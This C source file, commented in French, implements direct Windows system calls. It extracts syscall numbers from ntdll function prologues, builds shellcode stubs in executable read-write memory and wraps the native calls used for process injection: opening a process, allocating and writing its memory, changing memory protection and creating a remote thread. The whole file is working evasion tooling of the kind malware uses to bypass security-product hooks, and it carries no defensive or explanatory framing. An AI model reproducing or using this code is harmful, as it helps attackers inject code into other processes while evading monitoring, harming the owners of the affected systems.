#include "syscalls.h"
#include <stdio.h>
#include <string.h>

/* Template du shellcode syscall (x64) */
static const uint8_t shellcode_template[13] = {
    0x49, 0x89, 0xCA,                          /* mov r10, rcx */
    0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00,  /* mov rax, 0 (SSN placeholder) */
    0x0F, 0x05,                                /* syscall */
    0xC3                                       /* ret */
};

/* Cache global des SSN */
static ssn_cache_entry_t g_ssn_cache[MAX_SSN_CACHE];
static uint32_t g_cache_count = 0;

/* Stubs globaux pour les syscalls courants */
static syscall_stub_t g_stub_alloc_vm;
static syscall_stub_t g_stub_write_vm;
static syscall_stub_t g_stub_protect_vm;
static syscall_stub_t g_stub_create_thread;
static syscall_stub_t g_stub_open_process;
static syscall_stub_t g_stub_close;

/* Recherche un SSN dans le cache */
static uint32_t ssn_cache_lookup(const char* name) {
    for (uint32_t i = 0; i < g_cache_count; i++) {
        if (strcmp(g_ssn_cache[i].name, name) == 0) {
            return g_ssn_cache[i].ssn;
        }
    }
    return 0;
}

/* Ajoute un SSN au cache */
static void ssn_cache_add(const char* name, uint32_t ssn) {
    if (g_cache_count >= MAX_SSN_CACHE) return;

    g_ssn_cache[g_cache_count].name = name;
    g_ssn_cache[g_cache_count].ssn = ssn;
    g_cache_count++;
}

/*
 * Parse le SSN depuis le prologue d'une fonction NT
 * Logique inspirée de shadow_syscall : cherche sur 24 octets
 *
 * Pattern typique (x64):
 * 4C 8B D1             mov r10, rcx
 * B8 XX XX 00 00       mov eax, SSN
 * 0F 05                syscall
 * C3                   ret
 */
static uint32_t parse_ssn_from_function(void* function_address) {
    if (!function_address) return 0;

    uint8_t* bytes = (uint8_t*)function_address;

    /* Cherche le pattern sur 24 octets comme shadow_syscall */
    for (int i = 0; i < 24; i++) {
        /* Pattern: mov r10, rcx; mov eax, SSN */
        if (bytes[i]     == 0x4C &&
            bytes[i + 1] == 0x8B &&
            bytes[i + 2] == 0xD1 &&
            bytes[i + 3] == 0xB8 &&
            bytes[i + 6] == 0x00 &&
            bytes[i + 7] == 0x00) {

            /* Le SSN est dans les 4 octets après 0xB8 */
            uint32_t ssn;
            memcpy(&ssn, &bytes[i + 4], sizeof(uint32_t));
            return ssn;
        }
    }

    return 0;
}

/* Prépare un stub syscall */
int syscall_prepare(syscall_stub_t* stub, const char* function_name) {
    if (!stub || !function_name) return -1;

    memset(stub, 0, sizeof(syscall_stub_t));

    /* 1. Cherche dans le cache */
    uint32_t cached_ssn = ssn_cache_lookup(function_name);
    if (cached_ssn != 0) {
        stub->ssn = cached_ssn;
    } else {
        /* 2. Résout l'adresse de la fonction NT */
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return -1;

        void* nt_function = GetProcAddress(ntdll, function_name);
        if (!nt_function) return -1;

        /* 3. Parse le SSN */
        stub->ssn = parse_ssn_from_function(nt_function);
        if (stub->ssn == 0) return -1;

        /* 4. Ajoute au cache */
        ssn_cache_add(function_name, stub->ssn);
    }

    /* 5. Crée le shellcode */
    memcpy(stub->shellcode, shellcode_template, sizeof(shellcode_template));

    /* Écrit le SSN à l'offset 6 (4 bytes) */
    memcpy(&stub->shellcode[6], &stub->ssn, sizeof(uint32_t));

    /* 6. Alloue de la mémoire RWX */
    stub->exec_memory = VirtualAlloc(
        NULL,
        sizeof(stub->shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!stub->exec_memory) return -1;

    /* 7. Copie le shellcode en mémoire exécutable */
    memcpy(stub->exec_memory, stub->shellcode, sizeof(stub->shellcode));

    stub->initialized = 1;
    return 0;
}

/* Libère un stub */
void syscall_cleanup_stub(syscall_stub_t* stub) {
    if (!stub) return;

    if (stub->exec_memory) {
        VirtualFree(stub->exec_memory, 0, MEM_RELEASE);
        stub->exec_memory = NULL;
    }

    stub->initialized = 0;
}

/* Initialise les syscalls */
int syscalls_init(void) {
    /* Prépare les stubs pour les syscalls courants */
    if (syscall_prepare(&g_stub_alloc_vm, "NtAllocateVirtualMemory") != 0) return -1;
    if (syscall_prepare(&g_stub_write_vm, "NtWriteVirtualMemory") != 0) return -1;
    if (syscall_prepare(&g_stub_protect_vm, "NtProtectVirtualMemory") != 0) return -1;
    if (syscall_prepare(&g_stub_create_thread, "NtCreateThreadEx") != 0) return -1;
    if (syscall_prepare(&g_stub_open_process, "NtOpenProcess") != 0) return -1;
    if (syscall_prepare(&g_stub_close, "NtClose") != 0) return -1;

    return 0;
}

/* Nettoie les syscalls */
void syscalls_cleanup(void) {
    syscall_cleanup_stub(&g_stub_alloc_vm);
    syscall_cleanup_stub(&g_stub_write_vm);
    syscall_cleanup_stub(&g_stub_protect_vm);
    syscall_cleanup_stub(&g_stub_create_thread);
    syscall_cleanup_stub(&g_stub_open_process);
    syscall_cleanup_stub(&g_stub_close);

    g_cache_count = 0;
}

/* Wrappers haut niveau */

NTSTATUS nt_allocate_virtual_memory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    if (!g_stub_alloc_vm.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    NtAllocateVirtualMemory_t syscall_fn =
        (NtAllocateVirtualMemory_t)g_stub_alloc_vm.exec_memory;

    return syscall_fn(ProcessHandle, BaseAddress, ZeroBits,
                     RegionSize, AllocationType, Protect);
}

NTSTATUS nt_write_virtual_memory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    if (!g_stub_write_vm.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtWriteVirtualMemory_t)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

    NtWriteVirtualMemory_t syscall_fn =
        (NtWriteVirtualMemory_t)g_stub_write_vm.exec_memory;

    return syscall_fn(ProcessHandle, BaseAddress, Buffer,
                     NumberOfBytesToWrite, NumberOfBytesWritten);
}

NTSTATUS nt_protect_virtual_memory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    if (!g_stub_protect_vm.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtProtectVirtualMemory_t)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

    NtProtectVirtualMemory_t syscall_fn =
        (NtProtectVirtualMemory_t)g_stub_protect_vm.exec_memory;

    return syscall_fn(ProcessHandle, BaseAddress, RegionSize,
                     NewProtect, OldProtect);
}

NTSTATUS nt_create_thread_ex(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    if (!g_stub_create_thread.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtCreateThreadEx_t)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID,
        ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

    NtCreateThreadEx_t syscall_fn =
        (NtCreateThreadEx_t)g_stub_create_thread.exec_memory;

    return syscall_fn(ThreadHandle, DesiredAccess, ObjectAttributes,
                     ProcessHandle, StartRoutine, Argument, CreateFlags,
                     ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

NTSTATUS nt_open_process(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    if (!g_stub_open_process.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtOpenProcess_t)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

    NtOpenProcess_t syscall_fn =
        (NtOpenProcess_t)g_stub_open_process.exec_memory;

    return syscall_fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

NTSTATUS nt_close(HANDLE Handle)
{
    if (!g_stub_close.initialized) return -1;

    typedef NTSTATUS (__stdcall *NtClose_t)(HANDLE);

    NtClose_t syscall_fn = (NtClose_t)g_stub_close.exec_memory;

    return syscall_fn(Handle);
}
